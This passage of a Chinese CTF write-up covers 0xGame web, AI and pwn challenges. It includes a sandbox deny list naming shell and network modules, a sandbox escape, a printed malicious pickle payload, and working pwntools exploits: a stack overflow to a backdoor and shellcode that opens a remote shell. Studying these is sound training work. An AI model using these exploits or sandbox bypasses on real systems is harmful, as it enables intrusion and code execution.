    r'\bcommands\b',
    r'\b__import__\s*\(',
    r'\beval\s*\(',
    r'\bexec\s*\(',
    r'\bcompile\s*\(',
    r'\bopen\s*\(',
    r'\bfile\s*\(',
    r'\b__builtins__\b',
    r'\bimport\s+os\b',
    r'\bimport\s+sys\b',
    r'\bimport\s+subprocess\b',
    r'\bimport\s+pymysql\b',
    r'\bimport\s+sqlite3\b',
    r'\bimport\s+requests\b',
    r'\bimport\s+urllib\b',
    r'\bimport\s+http\b',
    r'\bimport\s+socket\b',
    r'\bimport\s+ftplib\b',
    r'\bimport\s+telnetlib\b',
    r'\bimport\s+pickle\b',
    r'\bimport\s+cpickle\b',
    r'\bimport\s+marshal\b',
    r'\bimport\s+ctypes\b',
    r'\bimport\s+multiprocessing\b',
    r'\bimport\s+threading\b',
    r'\bimport\s+concurrent\b',
    r'\bimport\s+io\b',
    r'\bimport\s+shlex\b',
    r'\bimport\s+pty\b',
    r'\bimport\s+popen\b',
    r'\bimport\s+shutil\b',
    r'\bimport\s+platform\b',
    r'\bimport\s+cffi\b',
    r'\bimport\s+importlib\b',
    r'\bgetattr\s*\(.*__import__',
    r'\bgetattr\s*\(.*eval',
    r'\bgetattr\s*\(.*exec',
    r'\bsetattr\s*\(',
    r'\b__getattribute__\b',
    r'\b__setattr__\b',
]
COMPILED_PATTERNS = [re.compile(p) for p in dangerous_patterns]

BANNED_MODULES = [
    'os', 'sys', 'subprocess', 'pymysql', 'sqlite3',
    'requests', 'urllib', 'http', 'socket', 'ftplib', 'telnetlib',
    'pickle', 'cpickle', 'marshal', 'ctypes',
    'multiprocessing', 'threading', 'concurrent',
    'importlib', 'imp', 'builtins',
    'shlex', 'pty', 'popen', 'shutil', 'platform', 'cffi', 'io',
]

BANNED_FUNCTIONS = [
    'eval', 'exec', 'compile', '__import__',
    'getattr', 'setattr', 'delattr',
    'globals', 'locals', 'vars', 'dir', 'type',
    'input', 'open', 'file', 'execfile', 'reload',
]

BANNED_METHODS = [
    'system', 'popen', 'spawn', 'execv', 'execl', 'execve', 'execlp', 'execvp',
    'chdir', 'kill', 'remove', 'unlink', 'rmdir', 'mkdir', 'makedirs', 'removedirs',
    'read', 'write', 'readlines', 'writelines',
    'load', 'loads', 'dump', 'dumps',
    'get_data', 'get_source', 'get_code', 'load_module', 'exec_module',
]

DANGEROUS_ATTRIBUTES = [
    '__class__', '__base__', '__bases__', '__mro__', '__subclasses__',
    '__globals__', '__builtins__', '__getattribute__', '__getattr__',
    '__setattr__', '__delattr__', '__call__',
]


class FilterError(Exception):
    pass


class ASTFilter(ast.NodeVisitor):
    def visit_Import(self, node):
        for alias in node.names:
            raise FilterError()
        self.generic_visit(node)

    def visit_ImportFrom(self, node):
        raise FilterError()

    def visit_Attribute(self, node):
        if node.attr in DANGEROUS_ATTRIBUTES:
            raise FilterError()
        if node.attr in BANNED_METHODS:
            raise FilterError()
        if node.attr in BANNED_FUNCTIONS:
            raise FilterError()
        self.generic_visit(node)

    def visit_Call(self, node):
        func = node.func
        if isinstance(func, ast.Name) and func.id in BANNED_FUNCTIONS:
            raise FilterError()
        self.generic_visit(node)

    def visit_Subscript(self, node):
        if isinstance(node.slice, ast.Constant) and isinstance(node.slice.value, str):
            key = node.slice.value
            if key in DANGEROUS_ATTRIBUTES or key in BANNED_METHODS \
                    or key in BANNED_FUNCTIONS or key in BANNED_MODULES:
                raise FilterError()
        self.generic_visit(node)


def _sandbox_builtins():
    b = dict(builtins.__dict__)
    b.pop('breakpoint', None)
    b.pop('input', None)
    return b


SANDBOX_BUILTINS = _sandbox_builtins()


def run_sandbox(code):
    code = unicodedata.normalize('NFKC', code)

    for pattern in COMPILED_PATTERNS:
        if pattern.search(code):
            return {'status': 'blocked', 'output': ''}

    try:
        tree = ast.parse(code)
    except SyntaxError:
        return {'status': 'blocked', 'output': ''}

    visitor = ASTFilter()
    try:
        visitor.visit(tree)
    except FilterError:
        return {'status': 'blocked', 'output': ''}

    sandbox = {'__builtins__': dict(SANDBOX_BUILTINS)}
    buf = io.StringIO()
    result = {}

    def _exec():
        try:
            with redirect_stdout(buf):
                exec(code, sandbox)
            result['output'] = buf.getvalue()
        except SystemExit:
            result['error'] = 'SystemExit'
        except BaseException:
            result['error'] = traceback.format_exc()

    worker = threading.Thread(target=_exec, daemon=True)
    worker.start()
    worker.join(SANDBOX_TIMEOUT)
    if worker.is_alive():
        return {'status': 'timeout', 'output': ''}

    if 'error' in result:
        return {'status': 'error',
                'output': (buf.getvalue() + '\n' + result['error'])[:MAX_OUTPUT_LEN]}

    output = result.get('output', '')
    if len(output) > MAX_OUTPUT_LEN:
        output = output[:MAX_OUTPUT_LEN]
    return {'status': 'ok', 'output': output}


@app.route('/')
def index():
    return render_template('index.html')


@app.route('/run', methods=['POST'])
def run():
    data = request.get_json(silent=True) or {}
    code = data.get('code', '')
    if not isinstance(code, str) or not code.strip():
        return jsonify({'status': 'ok', 'output': ''})
    if len(code) > MAX_CODE_LEN:
        return jsonify({'status': 'blocked', 'output': ''})
    return jsonify(run_sandbox(code))


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=PORT, debug=False)
```

**分析**

- 它`waf`了很多方法，但是我们依旧可以通过拼接变量执行shell

  比如`i = i = __import__`然后`o = i('os')`这样我们就算执行了`__import__('os')`

  接着我们可以调用`o`的内置方法，比如`environ`找`flag`

##### 2. 发起攻击

```python
i = __import__
o = i('os') 
print(o.environ)
```

```shell
environ({'KUBERNETES_SERVICE_PORT': '449', 'KUBERNETES_PORT': '1449', 'HOSTNAME': 'dep-3be744ac-1c6f-44bb-a623-1521d87b780c-798dccb88d-t2lqf', 'HOME': '/root', 'PYTHON_SHA256': '3b48dac8fb59f62eaa67ac83c1eb12bda1b7a08406dd286e252c11a66be27f81', 'KUBERNETES_PORT_443_TCP_ADDR': 'unix:///var/run/docker.sock', 'PATH': '/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin', 'KUBERNETES_PORT_443_TCP_PORT': '1449', 'KUBERNETES_PORT_443_TCP_PROTO': '', 'PYTHON_VERSION': '3.14.7', 'KUBERNETES_PORT_443_TCP': '', 'KUBERNETES_SERVICE_PORT_HTTPS': '449', 'KUBERNETES_SERVICE_HOST': 'unix:///var/run/docker.sock', 'PWD': '/app', 'FLAG': '0xGame{77dc200c-fe5e-4157-9b75-642c8362cdb6}', 'LC_CTYPE': 'C.UTF-8', 'WERKZEUG_SERVER_FD': '3'})
```

---

#### 题目答案

##### Payload

```payload
i = __import__
o = i('os') 
print(o.environ)
```

##### Flag

```flag
0xGame{77dc200c-fe5e-4157-9b75-642c8362cdb6}
```



### ATP代码实验

#### 题目介绍

> 作者 Spring. 
>
> 128 队已解出本题
>
> # ATP代码实验
>
> - 296分
> - 动态环境
> - Web
> - 入门
>
> ## 题目提示共1条
>
> ## **ATP | 生物实验类程序辅助教学平台**
>
> ATP 是一个支持 20+ 人同时在线的生物实验类教学平台，提供海量题库、多种题型、高级功能和教改项目。
>
> 今天，你需要完成一份C语言代码，用于模拟有氧呼吸合成 ATP 的过程。
>
> 代码不会写？没关系，我们为你提供了参考答案~

---

#### 解题过程

##### 1. 查看题目

- 禁用右键菜单
- 禁用`Ctrl+Shift+I`开发者工具组合键
- 开发者工具反调试，但可以抓间隔

##### 2. 查看源码

`submit.js`

```js
(function () {
  var editor = document.getElementById('code-editor');
  var gutter = document.getElementById('line-numbers');
  var result = document.getElementById('result');

  function renderLineNumbers() {
    var lines = editor.value.split('\n').length;
    var text = '';
    for (var i = 1; i <= lines; i++) {
      text += i + '\n';
    }
    gutter.textContent = text;
    gutter.scrollTop = editor.scrollTop;
  }

  editor.addEventListener('input', renderLineNumbers);
  editor.addEventListener('scroll', function () {
    gutter.scrollTop = editor.scrollTop;
  });
  renderLineNumbers();

  var form = document.getElementById('submit-form');

  form.addEventListener('submit', function (event) {
    event.preventDefault();
    result.className = 'result visible';
    result.textContent = '评测中……';
    fetch('/submit', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ code: editor.value })
    }).then(function (resp) {
      return resp.json();
    }).then(function (data) {
      if (data.ok) {
        result.className = 'result visible ok';
        result.textContent = '';
        var title = document.createElement('div');
        title.className = 'result-title';
        title.textContent = data.message;
        var label = document.createElement('div');
        label.className = 'flag-label';
        label.textContent = '评测通过，flag 如下：';
        var flagEl = document.createElement('code');
        flagEl.className = 'flag-value';
        flagEl.textContent = data.flag;
        result.appendChild(title);
        result.appendChild(label);
        result.appendChild(flagEl);
      } else {
        result.className = 'result visible fail';
        result.textContent = data.message;
      }
    }).catch(function (err) {
      result.className = 'result visible fail';
      result.textContent = '提交失败，请重试。';
    });
  });
})();
```

**分析**

- 他这里提交代码是直接向/submit发POST请求

- 我们先手动发一个，在network里抓包看看请求长什么样

  ```shell
  http://5000-592524bd-282f-4e6a-9106-c50b5f9427fe.challenge.ctfplus.cn/submit
  POST {"code":"test"}
  ```

  明文传输，我们可以写一个脚本发这个代码请求

- 另外，我发誓，等我空闲下来了，一定研究一下这题破解反调试和禁止粘贴的方法

##### 3. 编写脚本

```python
import requests
import fake_useragent
from requests import Response

session = requests.Session()

"""
Sync Post By Session
@param uri uri
@param params params
@param data data
@param headers headers
"""
def postBySession(uri: str, data: dict = None, params: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return session.post(url = uri, headers = headers, params = params, data = data)

url = "http://5000-592524bd-282f-4e6a-9106-c50b5f9427fe.challenge.ctfplus.cn/submit"

payload = r"""/*
 * ============================================
 *      _    _____ ____
 *     / \  |_   _|  _ \
 *    / _ \   | | | |_) |
 *   / ___ \  | | |  __/
 *  /_/   \_\ |_| |_|
 *
 *  ATP 在线实验平台  官方参考代码
 *  实验 1-1  合成 ATP，为细胞供能
 * ============================================
 *
 *  一个葡萄糖分子在有氧条件下彻底氧化，
 *  大约可以合成 30~32 个 ATP。
 *  本程序按三个阶段模拟这一过程。
 */

#include <stdio.h>

#define GLUCOSE  1   /* 反应底物：1 个葡萄糖分子 */
#define ATP_MAX  32  /* 有氧呼吸的 ATP 理论产量上限 */

/*
 * 阶段一：糖酵解（细胞质基质，不需要氧气）
 *
 * 葡萄糖被分解为两分子丙酮酸，净产生 2 个 ATP，
 * 同时生成少量 NADH，为后续阶段提供原料。
 * 返回丙酮酸分子数。
 */
int glycolysis(int glucose) {
    int pyruvate = glucose * 2;
    int atp = 2;
    printf("[阶段一] 糖酵解：葡萄糖 %d -> 丙酮酸 %d，ATP +%d\n",
           glucose, pyruvate, atp);
    return pyruvate;
}

/*
 * 阶段二：柠檬酸循环（线粒体基质）
 *
 * 丙酮酸被彻底氧化为 CO2。这一阶段直接产生的 ATP 很少，
 * 主要产物是 NADH 和 FADH2——它们携带的高能电子
 * 将在第三阶段用于合成 ATP。
 * （含丙酮酸氧化脱羧的贡献，共 10 个 NADH、2 个 FADH2）
 */
void citric_acid_cycle(int pyruvate, int *nadh, int *fadh2) {
    *nadh  = pyruvate * 5;
    *fadh2 = pyruvate;
    printf("[阶段二] 柠檬酸循环：NADH %d，FADH2 %d，ATP +2\n",
           *nadh, *fadh2);
}

/*
 * 阶段三：氧化磷酸化（线粒体内膜）
 *
 * NADH 和 FADH2 沿呼吸链传递电子，把质子泵到膜间隙，
 * 形成跨膜质子梯度。质子经 ATP 合酶回流时驱动其旋转，
 * 催化 ADP + Pi 合成 ATP。
 * 每个 NADH 约合成 2.5 个 ATP，每个 FADH2 约 1.5 个，
 * 细胞约 90% 的 ATP 产自这一阶段。
 */
int oxidative_phosphorylation(int nadh, int fadh2) {
    int atp = nadh * 5 / 2 + fadh2 * 3 / 2;
    printf("[阶段三] 氧化磷酸化：ATP +%d\n", atp);
    return atp;
}

int main(void) {
    int nadh = 0, fadh2 = 0;
    int total = 0;

    printf("开始模拟有氧呼吸\n");

    int pyruvate = glycolysis(GLUCOSE);
    total += 2;

    citric_acid_cycle(pyruvate, &nadh, &fadh2);
    total += 2;

    total += oxidative_phosphorylation(nadh, fadh2);

    printf("反应结束：葡萄糖 %d 个，共合成 ATP %d 个\n",
           GLUCOSE, total, ATP_MAX);

    return 0;
}
"""

print(postBySession(url, {"code":payload}).text)
```

```html
<div id="result" class="result visible ok"><div class="result-title">Accepted✅</div><div class="flag-label">评测通过，flag 如下：</div><code class="flag-value">0xGame{5479fc43-ba39-4a95-aa58-5ad52ade82ec}</code></div>
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{5479fc43-ba39-4a95-aa58-5ad52ade82ec}
```



### 奶蛙的博客

#### 题目介绍

> 作者 Spring. 
>
> 137 队已解出本题
>
> # 奶蛙的博客
>
> - 282分
> - Misc
> - Web
> - 动态环境
> - 简单
>
> 奶蛙写了个博客，记录了它每个大笑的瞬间~
>
> 
>
> > inex:什么是「美丽的汤」？好喝吗

---

#### 解题过程

##### 1. 查看题目

```shell
第 1 / 124 块碎片： H
第 2 / 124 块碎片： 4
```

**分析**

- 这很明显是要我们写一个脚本搜集这些碎片

##### 2. 编写脚本

```python
import requests
import fake_useragent
from requests import Response

request = requests

"""
Sync Get By Request
@param uri uri
@param params params
@param data data
@param headers headers
"""
def getByRequests(uri: str, params: dict = None, data: dict = None, headers = None) -> Response:
    if headers is None: headers = {"User-Agent": fake_useragent.UserAgent().random}
    return request.get(url = uri, headers = headers, params = params, data = data)

url = "http://8000-44404bf4-0fae-4856-b069-1ffd7d9397b8.challenge.ctfplus.cn/page?id="

for i in range(1, 124 + 1):
    result = getByRequests(url + str(i)).text.split("<span class=\"flag-fragment\">")[1][0]
    print(result,end="")
```

```shell
H4sIAAAAAAAA/wTAwQ2AMAgF0JXaADM4xo9BbQ&UA0GrMe7uK/eyjv11rpNhfLYu0OBpAvYNWsxIU0AXxYMjuA3yBGsUEWQnVE8Kp/z&AAAA//&XJ0P/SwAAAA==
```

**分析**

- `H4sIAAAAAAAA`开头的说明是**Base64 编码包裹的 gzip 压缩数据**
- 我们需要先将`&`改成`+`
- 然后`Base64`解码
- 最后读取`gzip`里面的内容

##### 3. 解密脚本

```python
import base64, gzip, io

s = "H4sIAAAAAAAA/wTAwQ2AMAgF0JXaADM4xo9BbQ&UA0GrMe7uK/eyjv11rpNhfLYu0OBpAvYNWsxIU0AXxYMjuA3yBGsUEWQnVE8Kp/z&AAAA//&XJ0P/SwAAAA=="

s_fixed = s.replace("&", "+")
raw = base64.b64decode(s_fixed)
with gzip.GzipFile(fileobj=io.BytesIO(raw)) as f:
    print(f.read().decode("utf-8"))
```

```shell
0xGame{n41w4_l4ugh5_cr4wl5_4nd_c0ll3ct5_3v3ry_fr4gm3nt_4cr055_th3_1nt3rn3t}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{n41w4_l4ugh5_cr4wl5_4nd_c0ll3ct5_3v3ry_fr4gm3nt_4cr055_th3_1nt3rn3t}
```



## AI



### ez_pytorch

#### 题目介绍

> 作者 Spring. 
>
> 101 队已解出本题
>
> # ez_pytorch
>
> - 351分
> - 无动态环境
> - AI
> - 入门
>
> 你从 Hugging Face 上下载了一个模型权重文件(.pth)。
>
> 这里有个加载脚本，但为啥报错了？

---

#### 解题过程

##### 1. 查看题目

直接运行`load.py`报错

用`WinHex`查看`model.pth`发现它不仅仅是一个权重文件，里面还藏有一个`zip`文件

打开zip发现`data.pkl`文件，然后在`data`目录中发现`0、1、2、3`文件

##### 2. data.pkl

```python
import pickletools
with open("data.pkl", "rb") as f:
    pickletools.dis(f)
```

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\study\python\main.py 
    0: \x80 PROTO      2
    2: c    GLOBAL     '__builtin__ exec'
   20: q    BINPUT     0
   22: X    BINUNICODE "# 你能执行到这里，说明 pickle 的 REDUCE 已经把 exec(这段代码) 跑起来了。\n# 想知道这段代码在字节流里长什么样：python -m pickletools 分析 data.pkl / model.pth\nimport zipfile as _z\n_zf = _z.ZipFile('model.pth')\n_b0 = _zf.read('model/data/0')\n_b1 = _zf.read('model/data/1').decode()\n_b2 = _zf.read('model/data/2').decode()\n_b3 = _zf.read('model/data/3').decode()\nimport base64 as _b\n# 如果你觉得逆向逻辑太难，那就去试试别的方法 :)\n_k0 = (0x5A, 0xA3, 0x3C)\n_r0 = []\nfor _i in range(len(_b0)):\n    _r0.append(_b0[_i] ^ _k0[_i % 3])\n_p0 = bytes(_r0)\n_p1 = _b.b64decode(_b1[::-1])\n_b2h = bytes.fromhex(_b2)\n_r2 = []\nfor _i in range(len(_b2h)):\n    _r2.append((_b2h[_i] - _i) & 0xFF)\n_p2 = bytes(_r2)\n_b3d = _b.b64decode(_b3)\n_k3 = 0xA5\n_r3 = []\nfor _i in range(len(_b3d)):\n    if _i == 0:\n        _r3.append(_b3d[0] ^ _k3)\n    else:\n        _r3.append(_b3d[_i] ^ _b3d[_i - 1])\n_p3 = bytes(_r3)\n_flag = (_p0 + _p1 + _p2 + _p3).decode()\nprint('你成功触发了pickle反序列化，程序输出了flag:' + _flag + '!')\nprint('希望你不要立刻开始下一题，能静下心搜集并了解一下pickle反序列化的原理')\nprint('简单来说，pytorch底层依赖python的pickle库，而pickle库会将load对象的__reduce__方法中的内容直接翻译为虚拟机指令，因此exec+python代码即可直接被执行')\nprint('这里如果改成os+命令即可实现远程RCE')\nprint('安全起见，pytorch在较新版本中使用默认weights_only=True参数，使用白名单来屏蔽恶意指令。不过，最安全的方法是使用safetensors库')\n"
 1645: q    BINPUT     1
 1647: \x85 TUPLE1
 1648: q    BINPUT     2
 1650: R    REDUCE
 1651: q    BINPUT     3
 1653: .    STOP
highest protocol among opcodes = 2

进程已结束，退出代码为 0
```

**分析**

- 可以看到 flag 被拆成 4 片，每片用不同方式编码：

  | 分片     | 编码方式                                    |
  | -------- | ------------------------------------------- |
  | `data/0` | 循环 XOR，密钥 `5A A3 3C`                   |
  | `data/1` | base64 字符串**反转**后解码                 |
  | `data/2` | hex 解码后，第 i 字节减去 i                 |
  | `data/3` | base64 解码后，每个字节与前一个密文字节异或 |

##### 3. 编写脚本

```python
import zipfile, base64

z = zipfile.ZipFile("model.pth")
b0 = z.read("model/data/0")
b1 = z.read("model/data/1").decode()
b2 = z.read("model/data/2").decode()
b3 = z.read("model/data/3").decode()

# data/0：循环 XOR
key = (0x5A, 0xA3, 0x3C)
p0 = bytes(b0[i] ^ key[i % 3] for i in range(len(b0)))

# data/1：字符串反转后 base64 解码
p1 = base64.b64decode(b1[::-1])

# data/2：hex 解码后逐字节减去下标
h = bytes.fromhex(b2)
p2 = bytes((h[i] - i) & 0xFF for i in range(len(h)))

# data/3：base64 解码后链式 XOR
d = base64.b64decode(b3)
r3 = [d[0] ^ 0xA5]
for i in range(1, len(d)):
    r3.append(d[i] ^ d[i - 1])
p3 = bytes(r3)

print((p0 + p1 + p2 + p3).decode())
```

```shell
0xGame{3z_p1ckl3_fOr_pyt0rch}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{3z_p1ckl3_fOr_pyt0rch}
```



## Pwn



### 奇妙杂货铺

#### 题目介绍

> 作者 x1z1 
>
> 93 队已解出本题
>
> # 奇妙杂货铺
>
> - 372分
> - 动态环境
> - Pwn
> - 入门
>
> 欢迎来到pwn梦最开始的地方。测试下你的nc，来尽情获得flag吧！！！
>
> [test]###....30%....58%.....99%### 
>
> [+]亲爱的玩家你好，由于一些不可抗力的原因，你的test nc任务被我们接管了。
>
> [+]欢迎来到号称“绝对没有 BUG”的自动化结算系统。
>
> [+]远古 Flag 的标价高达 99999 金币，而你的口袋里却只有可怜的 100 枚。
>
> [+]试着把购买的规则“倒”过来玩，也许财富不仅不用花，还会自己流进你的钱包。

---

#### 解题过程

##### 1. 查看题目

`netcat`

```shell
nc nc1.ctfplus.cn 30482
```

```shell
==================================================
        Welcome to the shop (Beta v1.1)
==================================================

[Wallet] balance: 100 gold
[List]
  1. blood bottle    ---- Sale: 10 gold
  2. Flag   ---- Sale: 99999 gold
  3. Exit
Choice (1-3): 1
Input the number you want:
```

**分析**

- 这里购买的数量可以是负数，这样我们就能够增加我们的金币

##### 2. 发起攻击

```shell
[Wallet] balance: 100 gold
[List]
  1. blood bottle    ---- Sale: 10 gold
  2. Flag   ---- Sale: 99999 gold
  3. Exit
Choice (1-3): 1
Input the number you want: -10000

--- calculating ---
price: 10 gold
number: -10000
cost: -100000 gold
Done

[Wallet] balance: 100100 gold
[List]
  1. blood bottle    ---- Sale: 10 gold
  2. Flag   ---- Sale: 99999 gold
  3. Exit
Choice (1-3): 2
Input the number you want: 1

--- calculating ---
price: 99999 gold
number: 1
cost: 99999 gold
Done

[ Congratulation!!! ]
Flag:
0xGame{Welc0m3_7o_th3_pwn_w0rld!!!}
```

---

#### 题目答案

##### Payload

```python
Payload 如上
```

##### Flag

```flag
0xGame{Welc0m3_7o_th3_pwn_w0rld!!!}
```



### 亦步亦趋

#### 题目介绍

> 作者 x1z1 
>
> 49 队已解出本题
>
> # 亦步亦趋
>
> - 559分
> - 动态环境
> - Pwn
> - 简单
>
> 欢迎来到勇气大闯关！！！
>
> 你能顺利冲破关卡并且成功找到通向成功之门的路吗？
>
> 我在终点等你哦~

---

#### 解题过程

##### 1. 查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  puts("Welcome to the world of Pwn !");
  puts("Here I will show you how to reslove the problem. Follow me,lets begin!");
  level1();
  return 0;
}
```

```c
__int64 level1()
{
  _BYTE buf[28]; // [rsp+0h] [rbp-20h] BYREF
  int v2; // [rsp+1Ch] [rbp-4h] BYREF

  v2 = 0;
  puts("\n==============================================");
  puts("[Level 1] Memory Roaming: Local Variable Overwriting");
  puts("==============================================");
  puts("In C, local variables are stored on the stack in order.");
  puts("target: using `gets` to change `magic` = 0xdeadbeef.\n");
  printf("[-] the address of buffer `buf` is about : %p\n", buf);
  printf("[-] the address of variables `magic` is about : %p\n", &v2);
  printf("Now input your Payload:\n> ");
  read(0, buf, 0x20u);
  if ( v2 != -559038737 )
  {
    printf("[-] Failure! The num of `magic` is about: 0x%x\n", v2);
    puts("[-] Tips how much bytes between buf and magic ? And do you know what is Little Endian ?");
    exit(0);
  }
  puts("[+] Congratulations! You have overwrited the magic and understand what is liitle-endian");
  return level2();
}
```

```c
__int64 level2()
{
  _BYTE v1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts("\n==============================================");
  puts("[Level 2] The real challenge: control flow! (Ret2Text)");
  puts("==============================================");
  puts("This time , you need to change the return address");
  printf("I have prepared backdoor for you. 'win', It's addr about: %p\n", win);
  printf("Now input your final Payload:\n> ");
  return gets(v1);
}
```

**分析**

- leave1: `buf`可覆盖到`rbp`，而`v2`到`rbp`的距离为`4`，我们可以用`buf`覆盖`v2`，用`pack`打包数字，或者直接用`p64(0xdeadbeef)`
- leave2: 栈溢出
- 我觉得这题主要是考验写脚本的能力吧

##### 2. 编写脚本

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 23608)
# r = process(["./pwn"])

# gdb.attach(r)

payload = cyclic(0x20 - 0x4) + pack(-559038737, 32, endian='little', signed=True)
r.sendafter("Now input your Payload:\n> ".encode(), payload)

r.recvuntil("It's addr about: 0x".encode())
backdoor_elf_addr = int("0x" + r.recvline().decode().strip(), 16) + (0x1220 - 0x1209)

print("backdoor_elf_addr", hex(backdoor_elf_addr))

payload = cyclic(0x20) + p64(0xdeadbeef) + p64(backdoor_elf_addr)
r.sendlineafter("Now input your final Payload:\n> ".encode(), payload)

r.interactive()
r.close()
```

```shell
D:\Environment\python\python-3.13.0\python.exe D:\Work\study\python\exp.py 
[x] Opening connection to nc1.ctfplus.cn on port 23608
[x] Opening connection to nc1.ctfplus.cn on port 23608: Trying 43.248.116.26
[+] Opening connection to nc1.ctfplus.cn on port 23608: Done
backdoor_elf_addr 0x55da2fa0d220
[*] Switching to interactive mode
ls
flag
pwn
cat flag
0xGame{R3t2t3xt_4nd_7th_st4ck_1s_m4gic}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{R3t2t3xt_4nd_7th_st4ck_1s_m4gic}
```

---

#### 漏洞成因

`read`过读造成的相邻变量覆盖

---

#### 修复意见

改成严格控制读取长度，改用`sizeof(buf)`，或改用`fgets`等边界明晰的输入函数



### ！？数学基础？！

#### 题目介绍

> 作者 x1z1 
>
> 55 队已解出本题
>
> # ！？数学基础？！
>
> - 525分
> - 动态环境
> - Pwn
> - 简单
>
> 戏子师傅刚刚结束高数的痛苦折磨。表示已经对于数学滚瓜烂熟了。
>
> 可是这时还在学习多位数运算的表弟发来需求，需要在极短时间内完成100道四则运算。
>
> 什么！这怎么可能完成啊...
>
> 你能帮帮戏子师傅吗QAQ...

---

#### 解题过程

##### 1. 查看题目

```shell
nc nc1.ctfplus.cn 31937
```

```shell
==================================================
                   (Scripting 101)
==================================================
系统提示：连续答对 100 道随机四则运算题，即可获得 Flag！
[round:1/100 ]
calculate: 411 一 398 = ?
Input your answer:
```

**分析**

- 这题的重点还是在考察编写脚本的能力，就不再过多赘述，也不过多解释脚本了
- 脚本Python代码如下

##### 2. 编写脚本

```python
import time

from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 31937)
# r = process(["./pwn"])

# gdb.attach(r)

for i in range(1, 100 + 1):
    r.recvuntil("calculate: ".encode())
    eq = r.recvuntil(" =".encode()).decode().strip().replace(" =", "").replace("＋", "+").replace("一", "-").replace("x", "*").replace("÷", "/")
    an = str(int(eval(eq))).encode()
    print(f"[{i}] {eq} = {an.decode()}")
    r.sendline(an)
    time.sleep(0.1)

r.interactive()
r.close()
```

```shell
[99] 29 * 28 = 812
[100] 98 * 82 = 8036
[*] Switching to interactive mode
 ?
Input your answer: [√] Correct!

==================================================
Flag: 0xGame{Y0u_4r3_7h3_PY7h0n_m4st3r}
==================================================
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{Y0u_4r3_7h3_PY7h0n_m4st3r}
```



### 两次回响

#### 题目介绍

> 作者 x1z1 
>
> 33 队已解出本题
>
> # 两次回响
>
> - 669分
> - 动态环境
> - Pwn
> - 简单
>
> "你有多少话想对我说？"
>
> "很多...很多..."
>
> "好了，不要说了。我最后听你说完九个字...我们，好聚好散"
>
> 你能用九个字帮我完成遗憾吗...

---

#### 解题过程

##### 1. 查看源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  void *buf; // [rsp+0h] [rbp-10h]

  init(argc, argv, envp);
  buf = mmap(0, 0x1000u, 7, 34, -1, 0);
  puts("What do you want to say ?");
  read(0, buf, 9u);
  ((void (*)(void))buf)();
  return 0;
}
```

**分析**

- 它先将`9`字节读进`buf`
- 然后`call buf`调用我们的`asm`
- 它`call buf`时寄存器的状态是：`rax=0, rdi=0, rsi=mmap起始地址, rdx=mmap起始地址`
- 因为它只读了`9`字节，所以我们的利用思路是先用这`9`字节`systemcall`一次read，然后它的`rip`会往后跳`6`个字节，我们可以在`6`个字节后写入我们的`shellcode`

##### 2. 编写脚本

```python
from pwn import *

context.os = "linux"
context.arch = "amd64"
# context.log_level = "debug"

r = remote("nc1.ctfplus.cn", 38879)

read = asm("""
    xor edx, edx
    mov dl, 0xff
    syscall
    nop
    nop
    nop
""")
nop = b"\x90"
r.send(read + nop * 6 + asm(shellcraft.sh())) # 多的字节写入了缓冲区

r.interactive()
r.close()
```

```shell
[*] Switching to interactive mode
What do you want to say ?
ls
flag
pwn
cat flag
0xGame{Sh3llc0de_c4n_do_3v3ry7h1ng}
```

---

#### 题目答案

##### 脚本

```python
脚本如上
```

##### Flag

```flag
0xGame{Sh3llc0de_c4n_do_3v3ry7h1ng}
```



### 保持沉默

#### 题目介绍

> 作者 x1z1 
>
> 30 队已解出本题
>
> # 保持沉默
>
> - 693分
> - 动态环境
> - Pwn
> - 中等
>
> 你成功潜入了目标服务器，满心欢喜地构造了泄露地址的 ROP 链，期待着屏幕上跳出那串神秘的基址。
>
> 然而，终端里只有一片死寂。
>
> 保持沉默是种美德... 
>
> [+] be quiet
>
> 在内存的深处，隐藏着一对密钥。唯有将它们正确地呈递，才能重新接通名为 dup2 的生命线。

---

##### 解题过程

##### 1. 分析源码

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  init(argc, argv, envp);
  printf("%s", wel);
  vuln();
  return 0;
}
```

```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  printf("%s", msg);
  if ( flag )
  {
    close(1);
    --flag;
  }
  return read(0, buf, 0x100u);
}
```

```c
int __fastcall put(__int64 a1, __int64 a2)
{
  if ( a1 != 3735928559LL || a2 != 38183 )
  {
    dup2(2, 1);
    printf("%s", failure);
    exit(0);
  }
  dup2(2, 1);
  return puts("[+] Congratulation! The rights have been unlocked!");
}
```

**分析**

- 题目`close(1)`关闭了标准输出，导致我们接收不到输出的信息，需要先ret到put解锁输出，同时将`rdi`和`rsi`设为响应的值。补充：0标准输入，1标准输出，2错误输出
- 接着我们就可以用`puts@plt`泄露`puts@got`以及`read@got`
- 这题没有给`libc`文件，我们考虑用`LibcSearcher`。补充：`DynELF`也是可以的
- 然后就是`ret2libc`的典型操作了

##### 2. 数据搜集

```assembly
┌──(.venv)─(kali㉿kali)-[~/Desktop/ctf/pwn/保持沉默]
└─$ ropper -f pwn --search "ret;"      
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: ret;

[INFO] File: pwn
0x000000000040101a: ret; 

                                                                   
